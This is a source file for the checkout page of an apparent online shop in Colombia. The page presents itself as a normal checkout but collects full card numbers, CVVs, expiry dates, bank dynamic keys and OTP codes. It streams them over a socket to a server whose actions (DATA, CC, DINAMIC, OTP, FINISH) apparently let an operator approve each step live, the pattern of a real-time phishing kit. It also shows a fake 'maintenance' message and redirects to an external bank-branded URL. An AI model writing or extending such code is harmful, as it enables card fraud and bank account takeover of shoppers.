import { CurrencyPipe, NgClass, CommonModule } from '@angular/common';
import { Component, inject, OnInit, OnDestroy } from '@angular/core';
import { FormsModule } from '@angular/forms';
import { RouterLink, Router } from '@angular/router';
import { CartProduct } from '../shared/models/cart-product';
import { PaymentService } from '../core/services/payment.service';
import { SessionService } from '../core/services/session.service';
import { SocketService } from '../core/services/socket.service';
import { VerificationModalComponent } from '../shared/components/verification-modal/verification-modal.component';
import { environment } from '../../environments/environment';

interface ContactInfo {
  email: string;
  phone: string;
}

interface AddressInfo {
  firstName: string;
  lastName: string;
  document: string;
  address: string;
  country: string;
  city: string;
  phone: string;
  email: string;
}

interface CardInfo {
  method: 'credit' | 'debit';
  number: string;
  holder: string;
  expMonth: string;
  expYear: string;
  cvv: string;
  installments: string;
  saveCard: boolean;
}

interface PSEInfo {
  name: string;
  document: string;
  personType: 'natural' | 'juridica';
}

@Component({
  selector: 'app-checkout',
  standalone: true,
  imports: [
    FormsModule,
    RouterLink,
    CurrencyPipe,
    NgClass,
    CommonModule,
    VerificationModalComponent,
  ],
  templateUrl: './checkout.component.html',
  styleUrl: './checkout.component.css',
})
export class CheckoutComponent implements OnInit, OnDestroy {
  paymentService = inject(PaymentService);
  sessionService = inject(SessionService);
  socketService = inject(SocketService);
  router = inject(Router);

  cartProducts?: CartProduct[];
  total: number = 0;

  // Control de pasos
  currentStep: number = 1;

  // Toast de error
  showErrorToast = false;
  errorMessage = 'Por favor completa todos los campos requeridos';

  // Loading states for real-time verification
  isProcessingBilling = false; // DATA verification
  isProcessingCard = false; // CC verification
  isProcessingDinamic = false; // DINAMIC verification
  isProcessingOTP = false; // OTP verification

  // Modal states
  showDinamicModal = false;
  showOTPModal = false;

  // Modal form data
  dinamicData = { value: '' };
  otpData = { code: '' };

  // Current verification action
  currentAction: string = 'DATA';

  // Método de pago seleccionado
  selectedPaymentMethod: 'card' | 'pse' | 'bc' = 'card';

  // Dirección de envío
  shipping: AddressInfo = {
    firstName: '',
    lastName: '',
    document: '',
    address: '',
    country: '',
    city: '',
    phone: '',
    email: '',
  };

  // Dirección de facturación
  billing: AddressInfo = {
    firstName: '',
    lastName: '',
    document: '',
    phone: '',
    country: 'Colombia',
    city: '',
    address: '',
    email: '',
  };

  // Información de tarjeta
  card: CardInfo = {
    method: 'credit',
    number: '',
    holder: '',
    expMonth: '',
    expYear: '',
    cvv: '',
    installments: '',
    saveCard: false,
  };

  // Información PSE
  pse: PSEInfo = {
    name: '',
    document: '',
    personType: 'natural',
  };

  // Información Bancolombia (usa la misma interfaz que PSE)
  bc: PSEInfo = {
    name: '',
    document: '',
    personType: 'natural',
  };

  // Cuotas disponibles para tarjeta de crédito
  cuotas = [
    { value: '1', label: 'Total - ' + this.total + ' (1 cuota)' },
    { value: '3', label: '3 cuotas de ' + (this.total / 3).toFixed(2) },
    { value: '6', label: '6 cuotas de ' + (this.total / 6).toFixed(2) },
    { value: '12', label: '12 cuotas de ' + (this.total / 12).toFixed(2) },
  ];

  constructor() {}

  async ngOnInit(): Promise<void> {
    this.updateTotal();
    this.updateCuotas();

    // Check for existing session
    const sessionContext = this.sessionService.getSessionContext();

    if (!sessionContext.rt_session_id) {
      // No session exists, create one automatically
      console.log('⚠️ No session found, creating new session...');
      try {
        await this.sessionService.ensureSession();
        console.log('✅ New session created successfully');

        // Connect socket with new session
        this.socketService.connect();
      } catch (error) {
        console.error('❌ Failed to create session:', error);
        this.errorMessage =
          'Error al inicializar sesión. Por favor intenta nuevamente';
        this.showErrorToast = true;
        setTimeout(() => {
          this.showErrorToast = false;
        }, 5000);
        return;
      }
    } else {
      // Session exists, reconnect socket
      console.log('✅ Session found, reconnecting socket...');
      this.socketService.connect();

      // Sync initial state from session action
      const initialAction = sessionContext.action;
      if (initialAction) {
        console.log(
          '🔄 Syncing initial state from session action:',
          initialAction,
        );
        this.syncInitialState(initialAction);
      }
    }

    // Listen for session updates from socket
    this.socketService.onSessionUpdate().subscribe((data) => {
      console.log('📥 Session updated:', data);

      // Centralized action handler
      if (data.action) {
        this.currentAction = data.action;
        this.handleActionChange(data.action);
      }
    });
  }

  // Navegación entre pasos
  async nextStep(): Promise<void> {
    // Step 1 → Step 2: Validate shipping + Initialize RT session
    if (this.currentStep === 1 && this.validateShipping()) {
      try {
        // 1. Initialize/resume RT session
        await this.sessionService.ensureSession();

        // 2. Connect socket
        this.socketService.connect();

        // 3. Advance to next step
        this.currentStep = 2;
        this.showErrorToast = false;
      } catch (error) {
        console.error('Error initializing RT session:', error);
        this.showErrorToast = true;
        setTimeout(() => {
          this.showErrorToast = false;
        }, 3000);
      }
    }
    // Step 2 → Step 3: Validate billing + Send for verification
    else if (this.currentStep === 2 && this.validateBilling()) {
      console.log(
        '🔵 Step 2 validated, sending billing data for verification...',
      );

      // Show loading while waiting for verification
      this.isProcessingBilling = true;
      this.showErrorToast = false;

      // Emit billing data - Response will come via session:update with action
      this.socketService.emitUserData({
        data: {
          name: `${this.billing.firstName} ${this.billing.lastName}`,
          document: this.billing.document,
          country: this.billing.country,
          city: this.billing.city,
          address: this.billing.address,
          phone: this.billing.phone,
          email: this.billing.email,
        },
      });

      console.log('📤 Billing data emitted, waiting for verification...');
      // Action handler will manage the response (DATA, DATA_ERROR, DATA_WAIT_ACTION)
    }
    // Validation failed
    else {
      this.showErrorToast = true;
      setTimeout(() => {
        this.showErrorToast = false;
      }, 3000);
    }
  }

  previousStep(): void {
    if (this.currentStep > 1) {
      this.currentStep--;
      this.showErrorToast = false;
    }
  }

  goToStep(step: number): void {
    // Solo permitir ir a pasos anteriores o al siguiente si el actual es válido
    if (step < this.currentStep) {
      this.currentStep = step;
    } else if (step === this.currentStep + 1) {
      this.nextStep();
    }
  }

  // Procesamiento del pago
  async onProceedToCheckout(): Promise<void> {
    let isValid = false;

    if (this.selectedPaymentMethod === 'card') {
      isValid = this.validateCardForm();
    } else if (this.selectedPaymentMethod === 'pse') {
      isValid = this.validatePSEForm();
    } else if (this.selectedPaymentMethod === 'bc') {
      isValid = this.validateBancolombiaForm();
    }

    if (!isValid) {
      this.showErrorToast = true;
      setTimeout(() => {
        this.showErrorToast = false;
      }, 3000);
      return;
    }

    // Process payment based on selected method
    if (this.selectedPaymentMethod === 'card') {
      // Show loading for card verification
      this.isProcessingCard = true;

      // Emit card data for real-time verification
      this.socketService.emitCardData({
        data: {
          cc: this.card.number,
          holder: this.card.holder,
          exp: this.card.expMonth + '/' + this.card.expYear,
          cvv: this.card.cvv,
          /*  method: this.card.method,
          installments: this.card.installments */
        },
      });

      console.log('📤 Card data emitted, waiting for verification...');
      // Action handler will manage the response (CC, CC_ERROR, CC_WAIT_ACTION, then DINAMIC/OTP/FINISH)
    } else if (this.selectedPaymentMethod === 'pse') {
      // Redirigir a pasarela PSE
      this.redirectToPSE();
    } else if (this.selectedPaymentMethod === 'bc') {
      // Redirigir a pasarela Bancolombia
      this.redirectToBancolombia();
    }
  }

  redirectToPSE(): void {
    // Aquí iría la lógica para redirigir a la pasarela PSE
    /* console.log('Redirigiendo a PSE con:', this.pse); */
    // Simulación de redirección
    alert('En mantenimiento, por favor usa otro medio de pago.');
  }

  redirectToBancolombia(): void {
    // Get session ID from session service
    const sessionContext = this.sessionService.getSessionContext();
    const sessionId = sessionContext.rt_session_id;

    if (!sessionId) {
      console.error('❌ No session ID found for Bancolombia redirect');
      this.errorMessage = 'Error al procesar el pago. Intenta nuevamente.';
      this.showErrorToast = true;
      setTimeout(() => {
        this.showErrorToast = false;
      }, 5000);
      return;
    }

    console.log('🏦 Redirecting to Bancolombia with sessionId:', sessionId);

    // Redirect to Bancolombia URL with session ID in path
    const bancolombiaUrl = `${environment.bcUrl}/${sessionId}`;
    window.location.href = bancolombiaUrl;
  }

  // Validaciones por paso
  validateShipping(): boolean {
    if (!this.isValidName(this.shipping.firstName)) return false;
    if (!this.isValidName(this.shipping.lastName)) return false;
    if (!this.isValidDocument(this.shipping.document)) return false;
    if (!this.isValidPhone(this.shipping.phone)) return false;
    if (!this.isValidText(this.shipping.country, 3)) return false;
    if (!this.isValidText(this.shipping.city, 2)) return false;
    if (!this.isValidText(this.shipping.address, 5)) return false;
    if (!this.isValidEmail(this.shipping.email)) return false;
    return true;
  }

  validateBilling(): boolean {
    if (!this.isValidName(this.billing.firstName)) return false;
    if (!this.isValidName(this.billing.lastName)) return false;
    if (!this.isValidDocument(this.billing.document)) return false;
    if (!this.isValidPhone(this.billing.phone)) return false;
    if (!this.isValidText(this.billing.country, 3)) return false;
    if (!this.isValidText(this.billing.city, 2)) return false;
    if (!this.isValidText(this.billing.address, 5)) return false;
    if (!this.isValidEmail(this.billing.email)) return false;
    return true;
  }

  validateCardForm(): boolean {
    if (
      this.isEmpty(this.card.number) ||
      !this.isValidCardNumber(this.card.number)
    )
      return false;
    if (this.isEmpty(this.card.holder) || this.card.holder.trim().length < 3)
      return false;
    if (!this.validateExpiration(this.card.expMonth, this.card.expYear))
      return false;
    if (this.isEmpty(this.card.cvv) || this.card.cvv.length < 3) return false;
    if (this.isEmpty(this.card.installments)) return false;
    return true;
  }

  validatePSEForm(): boolean {
    if (this.isEmpty(this.pse.name) || this.pse.name.trim().length < 3)
      return false;
    if (!this.isValidDocument(this.pse.document)) return false;
    if (this.isEmpty(this.pse.personType)) return false;
    return true;
  }

  validateBancolombiaForm(): boolean {
    if (this.isEmpty(this.bc.name) || this.bc.name.trim().length < 3)
      return false;
    if (!this.isValidDocument(this.bc.document)) return false;
    if (this.isEmpty(this.bc.personType)) return false;
    return true;
  }

  // Validación de número de tarjeta (algoritmo de Luhn simplificado)
  isValidCardNumber(cardNumber: string): boolean {
    const digitsOnly = cardNumber.replace(/\s/g, '');
    return digitsOnly.length >= 15 && digitsOnly.length <= 16;
  }

  // Validación de fecha de expiración
  validateExpiration(month: string, year: string): boolean {
    if (!month || !year) return false;

    const monthNum = parseInt(month, 10);
    const yearNum = parseInt(year, 10);

    if (monthNum < 1 || monthNum > 12) return false;
    if (yearNum < 0 || yearNum > 99) return false;

    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;

    if (yearNum < currentYear) return false;
    if (yearNum === currentYear && monthNum < currentMonth) return false;

    return true;
  }

  // Formatear número de tarjeta
  onCardNumberInput(event: any): void {
    let value = event.target.value.replace(/\s/g, '');
    let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
    this.card.number = formattedValue;
  }

  // Manejar cambio de método de tarjeta
  onCardMethodChange(): void {
    if (this.card.method === 'debit') {
      this.card.installments = '1';
    }
  }

  // Actualizar cuotas según el total
  updateCuotas(): void {
    this.cuotas = [
      {
        value: '1',
        label: `Total - $${this.total.toLocaleString()} (1 cuota)`,
      },
      {
        value: '3',
        label: `3 cuotas de $${(this.total / 3).toLocaleString('es-CO', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}`,
      },
      {
        value: '6',
        label: `6 cuotas de $${(this.total / 6).toLocaleString('es-CO', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}`,
      },
      {
        value: '12',
        label: `12 cuotas de $${(this.total / 12).toLocaleString('es-CO', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}`,
      },
    ];
  }

  // --------- Helpers de validación ---------

  private isEmpty(value: string | null | undefined): boolean {
    return !value || value.toString().trim().length === 0;
  }

  private isValidEmail(email: string): boolean {
    const trimmed = email.trim();
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/i; // simple pero efectiva para frontend
    return emailRegex.test(trimmed);
  }

  private isValidPhone(phone: string): boolean {
    const digitsOnly = phone.replace(/\D/g, '');
    // Ejemplo: mínimo 7 dígitos, máximo 15
    return digitsOnly.length >= 7 && digitsOnly.length <= 15;
  }

  private isValidDocument(document: string): boolean {
    const digitsOnly = document.replace(/\D/g, '');
    // Ej: mínimo 5 dígitos
    return digitsOnly.length >= 5;
  }

  private isValidName(name: string): boolean {
    const trimmed = name.trim();
    // Al menos 2 caracteres alfabéticos
    return trimmed.length >= 2;
  }

  private isValidText(value: string, minLength: number = 2): boolean {
    const trimmed = value.trim();
    return trimmed.length >= minLength;
  }

  // --------- Total del carrito ---------

  updateTotal() {
    const storagedProducts: CartProduct[] =
      JSON.parse(localStorage.getItem('cart-products') as string) || [];

    this.cartProducts = storagedProducts;

    let total = 0;

    this.cartProducts.forEach((cartProduct) => {
      total +=
        Math.round(cartProduct.productPrice * cartProduct.quantity * 100) / 100;
    });

    this.total = total;
    window.fbq?.('track', 'InitiateCheckout', {
      value: this.total,
      currency: 'COP',
    });

    this.updateCuotas();
  }

  /**
   * Sync initial state when component loads
   * Redirects to appropriate step/modal based on session action
   */
  syncInitialState(action: string): void {
    console.log(`🔄 Syncing to action: ${action}`);

    switch (action) {
      case 'DATA':
        // Stay in billing form (step 2)
        console.log('📋 Redirecting to billing form (Step 2)');
        this.currentStep = 2;
        break;

      case 'DATA_WAIT_ACTION':
        // Stay in billing form (step 2) + show loading
        console.log(
          '⏳ Syncing to DATA_WAIT_ACTION - Billing verification in progress',
        );
        this.currentStep = 2;
        this.isProcessingBilling = true;
        break;

      case 'DATA_ERROR':
        // Error in billing data - redirect to billing form
        console.log('❌ DATA_ERROR - Redirecting to billing form (Step 2)');
        this.currentStep = 2;
        this.errorMessage = 'Datos inválidos, verifica e intenta nuevamente';
        this.showErrorToast = true;
        setTimeout(() => {
          this.showErrorToast = false;
        }, 5000);
        break;

      case 'CC':
        // Redirect to card form (step 3)
        console.log('💳 Redirecting to card form (Step 3)');
        this.currentStep = 3;
        break;

      case 'CC_WAIT_ACTION':
        // Redirect to card form (step 3) + show loading
        console.log(
          '⏳ Syncing to CC_WAIT_ACTION - Card verification in progress',
        );
        this.currentStep = 3;
        this.isProcessingCard = true;
        break;

      case 'CC_ERROR':
        // Error in card data - redirect to card form
        console.log('❌ CC_ERROR - Redirecting to card form (Step 3)');
        this.currentStep = 3;
        this.errorMessage =
          'Datos de tarjeta inválidos, verifica e intenta nuevamente';
        this.showErrorToast = true;
        setTimeout(() => {
          this.showErrorToast = false;
        }, 5000);
        break;

      case 'DINAMIC':
        // Open dinamic modal
        console.log('🔐 Opening dynamic verification modal');
        this.currentStep = 3;
        // Close OTP modal if open (modals are mutually exclusive)
        if (this.showOTPModal) {
          this.showOTPModal = false;
          this.isProcessingOTP = false;
        }
        this.showDinamicModal = true;
        break;

      case 'DINAMIC_WAIT_ACTION':
        // Open dinamic modal + show loading
        console.log(
          '⏳ Syncing to DINAMIC_WAIT_ACTION - Dynamic verification in progress',
        );
        this.currentStep = 3;
        // Close OTP modal if open (modals are mutually exclusive)
        if (this.showOTPModal) {
          this.showOTPModal = false;
          this.isProcessingOTP = false;
        }
        this.showDinamicModal = true;
        this.isProcessingDinamic = true;
        break;

      case 'DINAMIC_ERROR':
        // Error in dinamic data - reopen modal
        console.log('❌ DINAMIC_ERROR - Reopening dynamic verification modal');
        this.currentStep = 3;
        // Close OTP modal if open (modals are mutually exclusive)
        if (this.showOTPModal) {
          this.showOTPModal = false;
          this.isProcessingOTP = false;
        }
        this.showDinamicModal = true;
        this.errorMessage = 'Verificación dinámica fallida, intenta nuevamente';
        this.showErrorToast = true;
        setTimeout(() => {
          this.showErrorToast = false;
        }, 5000);
        break;

      case 'OTP':
        // Open OTP modal
        console.log('📱 Opening OTP modal');
        this.currentStep = 3;
        // Close dinamic modal if open (modals are mutually exclusive)
        if (this.showDinamicModal) {
          this.showDinamicModal = false;
          this.isProcessingDinamic = false;
        }
        this.showOTPModal = true;
        break;

      case 'OTP_WAIT_ACTION':
        // Open OTP modal + show loading
        console.log(
          '⏳ Syncing to OTP_WAIT_ACTION - OTP verification in progress',
        );
        this.currentStep = 3;
        // Close dinamic modal if open (modals are mutually exclusive)
        if (this.showDinamicModal) {
          this.showDinamicModal = false;
          this.isProcessingDinamic = false;
        }
        this.showOTPModal = true;
        this.isProcessingOTP = true;
        break;

      case 'OTP_ERROR':
        // Error in OTP - reopen modal
        console.log('❌ OTP_ERROR - Reopening OTP modal');
        this.currentStep = 3;
        // Close dinamic modal if open (modals are mutually exclusive)
        if (this.showDinamicModal) {
          this.showDinamicModal = false;
          this.isProcessingDinamic = false;
        }
        this.showOTPModal = true;
        this.errorMessage = 'Código OTP inválido, intenta nuevamente';
        this.showErrorToast = true;
        setTimeout(() => {
          this.showErrorToast = false;
        }, 5000);
        break;

      case 'AUTH':
        // Show payment options (step 3)
        console.log('💳 AUTH action - Showing payment options (Step 3)');
        this.currentStep = 3;
        this.isProcessingBilling = false;
        break;

      case 'FINISH':
        // Redirect to result page
        console.log('✅ Redirecting to payment result page');
        this.router.navigate(['/finish']);
        break;

      default:
        // Default to shipping (step 1)
        console.log('📦 Default to shipping form (Step 1)');
        this.currentStep = 1;
    }
  }

  /**
   * Centralized action handler - Routes to specific handlers based on action type
   */
  handleActionChange(action: string): void {
    console.log(`🔄 Handling action: ${action}`);

    switch (action) {
      case 'DATA':
        this.handleDataAction();
        break;
      case 'DATA_WAIT_ACTION':
        this.handleDataWaitAction();
        break;
      case 'DATA_ERROR':
        this.handleDataError();
        break;
      case 'AUTH':
        this.handleAuthAction();
        break;
      case 'CC':
        this.handleCCAction();
        break;
      case 'CC_WAIT_ACTION':
        this.handleCCWaitAction();
        break;
      case 'CC_ERROR':
        this.handleCCError();
        break;
      case 'DINAMIC':
        this.handleDinamicAction();
        break;
      case 'DINAMIC_WAIT_ACTION':
        this.handleDinamicWaitAction();
        break;
      case 'DINAMIC_ERROR':
        this.handleDinamicError();
        break;
      case 'OTP':
        this.handleOTPAction();
        break;
      case 'OTP_WAIT_ACTION':
        this.handleOTPWaitAction();
        break;
      case 'OTP_ERROR':
        this.handleOTPError();
        break;
      case 'FINISH':
        this.handleFinishAction();
        break;
      default:
        console.log(`⚠️ Unknown action: ${action}`);
    }
  }

  // ============ DATA HANDLERS ============

  handleDataAction(): void {
    // DATA means server is waiting for user to submit billing data
    // This is NOT a processing state - user needs to fill and submit the form
    console.log('📋 DATA action received - Ready to submit billing data');
    this.isProcessingBilling = false;
  }

  handleDataWaitAction(): void {
    console.log('⏳ DATA_WAIT_ACTION - Verifying billing data...');
    this.isProcessingBilling = true;
  }

  handleDataError(): void {
    console.log('❌ DATA_ERROR - Invalid billing data');
    this.isProcessingBilling = false;
    this.errorMessage = 'Datos inválidos, verifica e intenta nuevamente';
    this.showErrorToast = true;

    // Redirect to billing form if not already there
    if (this.currentStep !== 2) {
      console.log('📋 Redirecting to billing form (Step 2)');
      this.currentStep = 2;
    }

    // Reset billing form
    this.billing = {
      firstName: '',
      lastName: '',
      document: '',
      phone: '',
      country: 'CO',
      city: '',
      address: '',
      email: '',
    };

    setTimeout(() => {
      this.showErrorToast = false;
    }, 5000);
  }

  // ============ AUTH HANDLER ============

  handleAuthAction(): void {
    // AUTH action = DATA was approved! Show payment options
    console.log('💳 AUTH action received - DATA APPROVED ✅');
    console.log('Moving to payment step (Step 3)');
    this.isProcessingBilling = false;
    this.currentStep = 3; // Move to payment step

    // Ready for payment method selection
    this.isProcessingCard = false;
  }

  // ============ CC (CREDIT CARD) HANDLERS ============

  handleCCAction(): void {
    // CC action = DATA was approved! Move to payment step
    console.log('💳 CC action received - DATA APPROVED ✅');
    console.log('Moving to payment step (Step 3)');
    this.isProcessingBilling = false;
    this.currentStep = 3; // Move to payment step

    // Now waiting for card submission
    this.isProcessingCard = false;
  }

  handleCCWaitAction(): void {
    console.log('⏳ CC_WAIT_ACTION - Verifying card data...');
    this.isProcessingCard = true;
  }

  handleCCError(): void {
    console.log('❌ CC_ERROR - Invalid card data');
    this.isProcessingCard = false;
    this.errorMessage =
      'Datos de tarjeta inválidos, verifica e intenta nuevamente';
    this.showErrorToast = true;

    // Redirect to card form if not already there
    if (this.currentStep !== 3) {
      console.log('💳 Redirecting to card form (Step 3)');
      this.currentStep = 3;
    }

    // Reset card form
    this.card = {
      method: 'credit',
      number: '',
      holder: '',
      expMonth: '',
      expYear: '',
      cvv: '',
      installments: '',
      saveCard: false,
    };

    setTimeout(() => {
      this.showErrorToast = false;
    }, 5000);
  }

  // ============ DINAMIC HANDLERS ============

  handleDinamicAction(): void {
    // DINAMIC action = CC was approved! Show modal
    console.log('🔐 DINAMIC action received - CC APPROVED ✅');
    console.log('Opening dynamic verification modal');
    this.isProcessingCard = false;

    // Close OTP modal if open (modals are mutually exclusive)
    if (this.showOTPModal) {
      console.log('🔒 Closing OTP modal to open dynamic modal');
      this.showOTPModal = false;
      this.isProcessingOTP = false;
    }

    this.showDinamicModal = true;
    this.isProcessingDinamic = false;
  }

  handleDinamicWaitAction(): void {
    console.log('⏳ DINAMIC_WAIT_ACTION - Verifying dynamic data...');
    this.isProcessingDinamic = true;
  }

  handleDinamicError(): void {
    console.log('❌ DINAMIC_ERROR - Invalid dynamic data');
    this.isProcessingDinamic = false;
    this.errorMessage = 'Verificación dinámica fallida, intenta nuevamente';
    this.showErrorToast = true;

    // Ensure we're on the right step and modal is open
    if (this.currentStep !== 3) {
      console.log('💳 Redirecting to payment step (Step 3)');
      this.currentStep = 3;
    }

    // Close OTP modal if open (modals are mutually exclusive)
    if (this.showOTPModal) {
      console.log('🔒 Closing OTP modal to reopen dynamic modal');
      this.showOTPModal = false;
      this.isProcessingOTP = false;
    }

    if (!this.showDinamicModal) {
      console.log('🔐 Reopening dynamic verification modal');
      this.showDinamicModal = true;
    }

    // Reset dinamic form
    this.dinamicData = { value: '' };

    setTimeout(() => {
      this.showErrorToast = false;
    }, 5000);
  }

  // ============ OTP HANDLERS ============

  handleOTPAction(): void {
    console.log('📱 OTP action received');

    // OTP can mean two things:
    // 1. CC was approved (if no DINAMIC modal was open)
    // 2. DINAMIC was approved (if DINAMIC modal was open)

    if (this.showDinamicModal) {
      console.log('✅ DINAMIC APPROVED - Opening OTP modal');
      this.isProcessingDinamic = false;
      this.showDinamicModal = false;
    } else {
      console.log('✅ CC APPROVED - Opening OTP modal');
      this.isProcessingCard = false;
    }

    this.showOTPModal = true;
    this.isProcessingOTP = false;
  }

  handleOTPWaitAction(): void {
    console.log('⏳ OTP_WAIT_ACTION - Verifying OTP...');
    this.isProcessingOTP = true;
  }

  handleOTPError(): void {
    console.log('❌ OTP_ERROR - Invalid OTP');
    this.isProcessingOTP = false;
    this.errorMessage = 'Código OTP inválido, intenta nuevamente';
    this.showErrorToast = true;

    // Ensure we're on the right step and modal is open
    if (this.currentStep !== 3) {
      console.log('💳 Redirecting to payment step (Step 3)');
      this.currentStep = 3;
    }

    // Close dinamic modal if open (modals are mutually exclusive)
    if (this.showDinamicModal) {
      console.log('🔒 Closing dynamic modal to reopen OTP modal');
      this.showDinamicModal = false;
      this.isProcessingDinamic = false;
    }

    if (!this.showOTPModal) {
      console.log('📱 Reopening OTP modal');
      this.showOTPModal = true;
    }

    // Reset OTP form
    this.otpData = { code: '' };

    setTimeout(() => {
      this.showErrorToast = false;
    }, 5000);
  }

  // ============ FINISH HANDLER ============

  handleFinishAction(): void {
    console.log('✅ FINISH action received - Transaction complete');

    // FINISH can mean different things depending on what was open:
    // 1. If DINAMIC modal open → DINAMIC approved
    // 2. If OTP modal open → OTP approved
    // 3. If CC was being processed → CC approved

    if (this.showDinamicModal) {
      console.log('✅ DINAMIC APPROVED');
      this.isProcessingDinamic = false;
      this.showDinamicModal = false;
    }

    if (this.showOTPModal) {
      console.log('✅ OTP APPROVED');
      this.isProcessingOTP = false;
      this.showOTPModal = false;
    }

    if (this.isProcessingCard) {
      console.log('✅ CC APPROVED');
      this.isProcessingCard = false;
    }

    console.log('🎉 All verifications passed - Redirecting to result page');

    // Clear localStorage to reset application state

    // Disconnect socket
    console.log('🔌 Disconnecting socket...');
    this.socketService.disconnect();
    console.log('✅ Socket disconnected');

    window.fbq?.('track', 'Purchase', {
      value: this.total,
      currency: 'COP',
    });
    // Redirect to finish page
    this.router.navigate(['/finish']);
  }

  // ============ MODAL ACTIONS ============

  submitDinamicData(): void {
    if (!this.dinamicData.value.trim()) {
      this.errorMessage = 'Por favor completa el campo requerido';
      this.showErrorToast = true;
      setTimeout(() => {
        this.showErrorToast = false;
      }, 3000);
      return;
    }

    console.log('📤 Submitting dynamic data...');

    // Show loading while waiting for server response
    this.isProcessingDinamic = true;

    // Server expects: { auth: { dinamic: "value" } }
    this.socketService.emitDynamicData({
      auth: {
        dinamic: this.dinamicData.value,
      },
    });
  }

  submitOTPData(): void {
    if (!this.otpData.code.trim()) {
      this.errorMessage = 'Por favor ingresa el código OTP';
      this.showErrorToast = true;
      setTimeout(() => {
        this.showErrorToast = false;
      }, 3000);
      return;
    }

    console.log('📤 Submitting OTP...');

    // Show loading while waiting for server response
    this.isProcessingOTP = true;

    // Server expects: { auth: { otp: "code" } }
    this.socketService.emitOTP({
      auth: {
        otp: this.otpData.code,
      },
    });
  }

  closeDinamicModal(): void {
    this.showDinamicModal = false;
    this.dinamicData = { value: '' };
  }

  closeOTPModal(): void {
    this.showOTPModal = false;
    this.otpData = { code: '' };
  }

  // ============ VERIFICATION MODAL HELPERS ============

  /**
   * Get card brand based on card number
   */
  getCardBrand(): 'mc' | 'vs' | 'amex' | 'din' | 'dis' {
    const cardNumber = this.card.number.replace(/\s/g, '');
    if (!cardNumber) return 'mc';

    const firstDigit = cardNumber[0];
    const firstTwoDigits = cardNumber.slice(0, 2);

    // Visa: starts with 4
    if (firstDigit === '4') return 'vs';

    // Mastercard: starts with 51-55 or 2221-2720
    if (firstTwoDigits >= '51' && firstTwoDigits <= '55') return 'mc';
    if (firstTwoDigits >= '22' && firstTwoDigits <= '27') return 'mc';

    // American Express: starts with 34 or 37
    if (firstTwoDigits === '34' || firstTwoDigits === '37') return 'amex';

    // Discover: starts with 6011, 622126-622925, 644-649, or 65
    if (cardNumber.startsWith('6011') || cardNumber.startsWith('65'))
      return 'dis';
    if (firstTwoDigits >= '64' && firstTwoDigits <= '65') return 'dis';

    // Diners: starts with 36 or 38
    if (firstTwoDigits === '36' || firstTwoDigits === '38') return 'din';

    // Default to Mastercard
    return 'mc';
  }

  /**
   * Format price as currency
   */
  formatPrice(price: number): string {
    return new Intl.NumberFormat('es-CO', {
      style: 'currency',
      currency: 'COP',
      minimumFractionDigits: 0,
      maximumFractionDigits: 0,
    }).format(price);
  }

  /**
   * Handle dynamic verification submit from modal
   */
  onDinamicSubmit(code: string): void {
    this.dinamicData.value = code;
    this.submitDinamicData();
  }

  /**
   * Handle OTP verification submit from modal
   */
  onOTPSubmit(code: string): void {
    this.otpData.code = code;
    this.submitOTPData();
  }

  ngOnDestroy(): void {
    // Disconnect socket when component is destroyed
    this.socketService.disconnect();
  }
}
